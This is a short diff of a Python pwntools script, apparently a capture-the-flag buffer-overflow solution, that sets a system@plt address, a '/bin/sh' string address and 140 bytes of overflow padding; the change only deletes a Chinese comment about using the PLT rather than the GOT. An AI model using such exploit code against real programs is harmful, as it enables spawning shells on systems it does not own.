@@ -1,7 +1,7 @@
 #coding:utf-8
 from pwn import *
 
-system_plt=0x080483A0 #这里不能用got,system前面没用过
+system_plt=0x080483A0 
 binsh=0x08048610
 ret=0
 ov=b"A"*140
